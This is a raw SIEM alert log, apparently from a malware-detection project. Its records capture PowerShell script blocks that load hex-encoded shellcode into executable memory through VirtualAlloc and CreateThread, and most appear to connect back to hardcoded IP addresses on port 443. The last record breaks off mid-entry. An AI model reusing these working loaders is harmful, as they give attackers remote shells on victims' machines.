{"timestamp":"2026-07-06T02:19:28.281+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":95,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304368.2683004","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:48.1448674Z","eventRecordID":"145155","processID":"6788","threadID":"4388","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$4WZB = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $4WZB -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x30,0xbf,0xe8,0xd5,0xdd,0xc6,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x7d,0x0f,0x03,0x7d,0x3f,0x5d,0x1d,0x29,0xd7,0x23,0xde,0xd2,0x27,0x44,0x56,0x37,0x16,0x44,0x0c,0x33,0x08,0x74,0x46,0x11,0xa4,0xff,0x0a,0x82,0x3f,0x8d,0x82,0xa5,0x88,0x38,0xf5,0x88,0x09,0x10,0xc5,0x8b,0x89,0x6b,0x1a,0x6c,0xb0,0xa3,0x6f,0x6d,0xf5,0xde,0x82,0x3f,0xae,0x95,0x31,0xd0,0xdb,0xe0,0x89,0x5b,0x97,0xe5,0x89,0xb8,0x6f,0x07,0xbb,0x6e,0xe4,0x5e,0x1b,0x90,0x29,0xeb,0x12,0x8a,0x2e,0xd6,0xed,0x21,0x84,0xac,0xef,0xe3,0xd5,0x4d,0x43,0xca,0xda,0xbf,0x9d,0x0a,0xdc,0x5f,0xe8,0x62,0x1f,0xdd,0xeb,0xb0,0x62,0x39,0x79,0x23,0xc4,0xca,0xd9,0x8f,0xf5,0x1f,0xbf,0x44,0xf9,0xd4,0xcb,0x03,0x1d,0xea,0x18,0x38,0x19,0x67,0x9f,0xef,0xa8,0x33,0x84,0x2b,0xf1,0xe0,0xa5,0x6a,0x5f,0x46,0xd9,0x6d,0x00,0x37,0x7f,0xe5,0xac,0x2c,0xf2,0xa4,0xb8,0x81,0x3f,0x57,0x38,0x8e,0x48,0x24,0x0a,0x11,0xe3,0xa2,0x26,0xda,0x2d,0x34,0x49,0xf1,0x8a,0xaa,0xb4,0xfa,0xea,0xe3,0x72,0xae,0xba,0x9b,0x53,0xcf,0x50,0x5c,0x5c,0x1a,0xcc,0x59,0xca,0x65,0xb9,0x63,0x0f,0x0e,0xb8,0x63,0x0e,0x75,0x35,0x85,0x40,0xd9,0x16,0x1a,0x20,0x89,0xd6,0xca,0xc8,0xc3,0xd8,0x35,0xe8,0xeb,0x32,0x5e,0x82,0x03,0xeb,0x36,0x3a,0xbd,0xb6,0xcd,0xdb,0x42,0x6d,0xa8,0xdb,0xc9,0x82,0x4c,0x95,0x39,0xee,0x5e,0x41,0xca,0xa5,0x3d,0xc7,0xd5,0x13,0x2b,0xe7,0x43,0x98,0xfa,0xb0,0xfb,0xa2,0xdb,0xf6,0xa3,0x5d,0x0e,0x8d,0x6a,0xc8,0xf1,0xf9,0x92,0x1c,0xf2,0xf9,0xc4,0x76,0xf2,0x91,0xb0,0x22,0xa1,0x84,0xbe,0xfe,0xd5,0x15,0x2b,0x01,0x8c,0xca,0xfc,0x69,0x32,0x35,0xca,0x35,0xcd,0x10,0xca,0x0a,0x18,0x5c,0xb8,0x62,0x98;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$zPz9=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($zPz9.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$zPz9,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: e1859d7e-b499-4388-a21e-7d9a489dc734\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2065.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$4WZB = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $4WZB -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x30,0xbf,0xe8,0xd5,0xdd,0xc6,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x7d,0x0f,0x03,0x7d,0x3f,0x5d,0x1d,0x29,0xd7,0x23,0xde,0xd2,0x27,0x44,0x56,0x37,0x16,0x44,0x0c,0x33,0x08,0x74,0x46,0x11,0xa4,0xff,0x0a,0x82,0x3f,0x8d,0x82,0xa5,0x88,0x38,0xf5,0x88,0x09,0x10,0xc5,0x8b,0x89,0x6b,0x1a,0x6c,0xb0,0xa3,0x6f,0x6d,0xf5,0xde,0x82,0x3f,0xae,0x95,0x31,0xd0,0xdb,0xe0,0x89,0x5b,0x97,0xe5,0x89,0xb8,0x6f,0x07,0xbb,0x6e,0xe4,0x5e,0x1b,0x90,0x29,0xeb,0x12,0x8a,0x2e,0xd6,0xed,0x21,0x84,0xac,0xef,0xe3,0xd5,0x4d,0x43,0xca,0xda,0xbf,0x9d,0x0a,0xdc,0x5f,0xe8,0x62,0x1f,0xdd,0xeb,0xb0,0x62,0x39,0x79,0x23,0xc4,0xca,0xd9,0x8f,0xf5,0x1f,0xbf,0x44,0xf9,0xd4,0xcb,0x03,0x1d,0xea,0x18,0x38,0x19,0x67,0x9f,0xef,0xa8,0x33,0x84,0x2b,0xf1,0xe0,0xa5,0x6a,0x5f,0x46,0xd9,0x6d,0x00,0x37,0x7f,0xe5,0xac,0x2c,0xf2,0xa4,0xb8,0x81,0x3f,0x57,0x38,0x8e,0x48,0x24,0x0a,0x11,0xe3,0xa2,0x26,0xda,0x2d,0x34,0x49,0xf1,0x8a,0xaa,0xb4,0xfa,0xea,0xe3,0x72,0xae,0xba,0x9b,0x53,0xcf,0x50,0x5c,0x5c,0x1a,0xcc,0x59,0xca,0x65,0xb9,0x63,0x0f,0x0e,0xb8,0x63,0x0e,0x75,0x35,0x85,0x40,0xd9,0x16,0x1a,0x20,0x89,0xd6,0xca,0xc8,0xc3,0xd8,0x35,0xe8,0xeb,0x32,0x5e,0x82,0x03,0xeb,0x36,0x3a,0xbd,0xb6,0xcd,0xdb,0x42,0x6d,0xa8,0xdb,0xc9,0x82,0x4c,0x95,0x39,0xee,0x5e,0x41,0xca,0xa5,0x3d,0xc7,0xd5,0x13,0x2b,0xe7,0x43,0x98,0xfa,0xb0,0xfb,0xa2,0xdb,0xf6,0xa3,0x5d,0x0e,0x8d,0x6a,0xc8,0xf1,0xf9,0x92,0x1c,0xf2,0xf9,0xc4,0x76,0xf2,0x91,0xb0,0x22,0xa1,0x84,0xbe,0xfe,0xd5,0x15,0x2b,0x01,0x8c,0xca,0xfc,0x69,0x32,0x35,0xca,0x35,0xcd,0x10,0xca,0x0a,0x18,0x5c,0xb8,0x62,0x98;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$zPz9=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($zPz9.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$zPz9,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"e1859d7e-b499-4388-a21e-7d9a489dc734","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2065.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:28.397+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":96,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304368.2694373","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:48.9762540Z","eventRecordID":"145159","processID":"3732","threadID":"6508","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xac,0x10,0x02,0x16,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 7818e1fb-c317-4048-86af-49805c4ade56\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2067.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xac,0x10,0x02,0x16,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"7818e1fb-c317-4048-86af-49805c4ade56","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2067.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:29.254+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":97,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304369.2705322","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:49.8059278Z","eventRecordID":"145163","processID":"8256","threadID":"7400","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x19,0x7e,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: d0ac68da-0ebc-4e7a-8d04-642b22b2173f\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2073.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x19,0x7e,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"d0ac68da-0ebc-4e7a-8d04-642b22b2173f","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2073.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:30.807+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":98,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304370.2716271","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:50.6524863Z","eventRecordID":"145167","processID":"5708","threadID":"9104","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x5f,0x6f,0x5a,0x38,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 4b4ec627-472d-4dec-a6d0-d7b2e0865161\r\nPath: 